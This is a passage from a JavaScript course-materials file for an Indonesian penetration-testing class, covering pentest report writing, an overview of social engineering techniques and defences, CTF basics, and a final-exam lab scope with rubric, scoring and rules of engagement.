Sesi ini mencakup 3 skill penting:
1. 📄 **Report Writing** - Dokumentasi profesional
2. 🎭 **Social Engineering** - Human hacking
3. 🏁 **CTF** - Capture The Flag challenges

</div>

---

## 📚 Bagian 1: Professional Report Writing

### 📄 Struktur Laporan Pentest

<div class="info-box">

#### 1️⃣ Executive Summary
- Ringkasan untuk non-teknis
- Key findings
- Business impact

#### 2️⃣ Methodology
- Langkah-langkah yang dilakukan
- Tools yang digunakan

#### 3️⃣ Findings
Setiap temuan harus memiliki:
- 🏷️ **Title** - Nama deskriptif
- 🎨 **Severity** - Critical/High/Medium/Low
- 📊 **CVSS Score** - 0.0 - 10.0
- 📝 **Description** - Penjelasan teknis
- 📸 **Evidence** - Screenshot, logs
- 💥 **Impact** - Dampak bisnis/teknis
- 🔧 **Remediation** - Cara memperbaiki

#### 4️⃣ Recommendations
- Diprioritaskan berdasarkan risiko
- Spesifik dan actionable

</div>

---

## 📚 Bagian 2: Social Engineering

### 🎭 Seni Manipulasi Manusia

**Social Engineering** adalah teknik mendapatkan informasi/akses melalui manipulasi psikologis, bukan teknis.

<div class="comparison-table">

### 🎯 Teknik-teknik Social Engineering

| Teknik | Cara Kerja |
|--------|------------|
| **Phishing** | Email palsu meniru organisasi legit |
| **Pretexting** | Membuat skenario/cerita palsu |
| **Baiting** | USB atau download yang mengandung malware |
| **Tailgating** | Mengikuti orang ke area restricted |
| **Vishing** | Penipuan via telepon |

</div>

### 🛡️ Pertahanan

- ✅ Security awareness training
- ✅ Verifikasi identitas
- ✅ Jangan share info sensitif
- ✅ Multi-factor authentication

---

## 📚 Bagian 3: CTF (Capture The Flag)

### 🏁 Apa itu CTF?

Kompetisi keamanan siber di mana peserta memecahkan challenges untuk menemukan **flag** tersembunyi.

### 📋 Format Flag

\`\`\`
FLAG{this_is_a_sample_flag}
CTF{challenge_solved}
\`\`\`

### 🎮 Kategori CTF

<div class="tools-grid">

| Kategori | Topik |
|----------|-------|
| **Web** | SQLi, XSS, IDOR |
| **Crypto** | Encoding, Ciphers |
| **Forensics** | File analysis, Memory |
| **Reverse** | Binary, Decompilation |
| **Pwn** | Buffer overflow |
| **Stego** | Hidden data in images |

</div>

### 🧰 Tools CTF

| Kategori | Tools |
|----------|-------|
| Web | Burp Suite, curl, DevTools |
| Crypto | CyberChef, dcode.fr |
| Forensics | Autopsy, Wireshark |
| Stego | steghide, binwalk |

---

## 💡 Tips CTF

1. 📖 **Baca dengan teliti** - Challenge description sering mengandung hint
2. 🔍 **Mulai dari yang simple** - Coba teknik dasar dulu
3. 📝 **Catat semuanya** - Dokumentasi adalah kunci
4. 🔎 **Google dengan bijak** - Belajar dari writeup
5. 👥 **Kolaborasi** - Teamwork makes the dream work

---

## 🎯 Tugas Praktikum Sesi Ini

<div class="task-box">

### 📋 Yang Harus Kamu Lakukan:

**Report Writing:**
1. ✅ Buat executive summary dari Session 1-6
2. ✅ Format findings dengan evidence

**CTF:**
1. ✅ Selesaikan Web challenges
2. ✅ Decode pesan cryptography
3. ✅ Temukan hidden flags

**🎮 CTF Platform**: Tersedia di menu CTF

</div>

> 🎮 **Have fun!** CTF adalah cara terbaik belajar sambil bermain!
`,
    prerequisites: [
      'Menyelesaikan Session 1-6',
      'Kemampuan menulis teknis',
      'Pemahaman tentang keamanan informasi',
      'Problem-solving mindset',
    ],
    resources: [
      { title: 'SANS Report Writing Template', url: 'https://www.sans.org/white-papers/', type: 'template' },
      { title: 'CTFtime', url: 'https://ctftime.org/', type: 'platform' },
      { title: 'PicoCTF', url: 'https://picoctf.org/', type: 'platform' },
      { title: 'CyberChef', url: 'https://gchq.github.io/CyberChef/', type: 'tool' },
    ],
    keyCommands: [
      { command: 'ctf list', description: 'Lihat daftar CTF challenges yang tersedia', example: 'ctf list' },
      { command: 'submit-flag <flag>', description: 'Submit flag untuk CTF challenge', example: "submit-flag FLAG{example_flag}" },
      { command: 'echo <text> | base64 -d', description: 'Decode Base64 encoded text', example: "echo 'SGVsbG8gV29ybGQ=' | base64 -d" },
      { command: 'file <filename>', description: 'Identify file type', example: 'file mysterious_file' },
    ],
  },

  // Session 8: UAS
  session8: {
    theoryContent: `
# 🎓 Session 8: UAS - Full Penetration Test Simulation

<div class="intro-box">

## 🎯 Final Exam!

Ujian Akhir Semester adalah **simulasi penetration test lengkap** yang menguji SEMUA yang telah kamu pelajari.

</div>

---

## 📋 Scope Pengujian

<div class="info-box">

### 🌐 Target Environment

| 🖥️ Target | 📍 IP | 💻 OS |
|-----------|-------|-------|
| **Primary** | 10.0.0.50 | Windows Server 2019 |
| **Secondary** | 10.0.0.51 | Linux Web Server |
| **Tertiary** | 10.0.0.52 | Database Server |

**Network Range**: 10.0.0.0/24

</div>

---

## 📊 Rubrik Penilaian

<div class="comparison-table">

| 📋 Komponen | 📊 Bobot | 📝 Kriteria |
|-------------|----------|-------------|
| Reconnaissance | 15% | Kelengkapan info gathering |
| Scanning | 15% | Thoroughness enumeration |
| Exploitation | 25% | Successful exploitation |
| Privilege Escalation | 15% | Escalating access |
| Data Collection | 15% | Finding all flags |
| Report Quality | 15% | Professional documentation |

</div>

---

## 🔄 Metodologi

\`\`\`
┌──────────────┐    ┌─────────────┐    ┌──────────────┐
│   PHASE 1    │───▶│   PHASE 2   │───▶│   PHASE 3    │
│ Reconnaissance│    │  Scanning   │    │ Exploitation │
└──────────────┘    └─────────────┘    └──────────────┘
                                              │
┌──────────────┐    ┌─────────────┐           ▼
│   PHASE 5    │◀───│   PHASE 4   │◀───┌──────────────┐
│  Reporting   │    │Post-Exploit │    │ Priv Escalate│
└──────────────┘    └─────────────┘    └──────────────┘
\`\`\`

---

## ⏱️ Timeline

<div class="info-box">

| Phase | Duration |
|-------|----------|
| **Reconnaissance** | 30 menit |
| **Scanning & Enumeration** | 45 menit |
| **Exploitation & PrivEsc** | 60 menit |
| **Reporting** | 45 menit |
| **TOTAL** | **3 jam** |

</div>

---

## 🏆 Flags to Collect

\`\`\`
FLAG{reconnaissance_master}
FLAG{port_scanner_pro}
FLAG{sql_injection_expert}
FLAG{privilege_escalated}
FLAG{final_boss_defeated}
\`\`\`

---

## 📝 Deliverables

1. **Penetration Testing Report**
   - Executive Summary
   - Technical Findings
   - Evidence (screenshots)
   - Risk Assessment
   - Recommendations

2. **Flags Collected**
   - Submit semua flags yang ditemukan

3. **Reflection**
   - Learning experience
   - Challenges & solutions

---

## ⚠️ Rules of Engagement

<div class="warning-box">

### ✅ Allowed:
- Scan & enumerate semua target dalam scope
- Exploit vulnerabilities
- Privilege escalation
- Collect flags & evidence

### ❌ Not Allowed:
- Attack systems outside scope
- DoS attacks
- Destructive actions
- Share answers

</div>

---

## 💡 Final Tips

1. ⏰ **Manage your time** - Jangan terlalu lama di satu target
2. 📸 **Document everything** - Screenshot setiap langkah
3. 🎯 **Think systematically** - Ikuti metodologi
4. 🧘 **Don't panic** - Stuck? Pindah dulu, kembali nanti
5. ✨ **Quality > Quantity** - Lebih baik complete sedikit

---

## 🏆 Scoring

<div class="comparison-table">

| Achievement | Points |
|-------------|--------|
| Each flag found | 50 pts |
| Each vuln exploited | 30 pts |
| Privilege escalation | 50 pts |
| Complete methodology | 20 pts |
| Professional report | 50 pts |
| **Maximum** | **500 pts** |

</div>

---

<div class="task-box">

## 🎓 Good luck on your final exam!

Tunjukkan semua yang telah kamu pelajari.

Ingat: seorang pentester yang baik bukan hanya tentang **skill teknis**, tapi juga tentang **metodologi**, **dokumentasi**, dan **komunikasi**.

</div>
`,
    prerequisites: [
      'Menyelesaikan semua Session 1-7',
      'Pemahaman komprehensif metodologi pentesting',
      'Kemampuan menggunakan semua tools yang dipelajari',
      'Kemampuan menulis laporan profesional',
    ],
    resources: [
      { title: 'Review semua materi Session 1-7', url: '#', type: 'review' },
      { title: 'Checklist Penetration Testing', url: '#', type: 'checklist' },
    ],
    keyCommands: [
      { command: 'Semua commands yang dipelajari', description: 'Gunakan semua pengetahuan dari Session 1-7', example: 'whois, nmap, sqlmap, msfconsole, dll' },
    ],
  },
};

export default labMaterials;
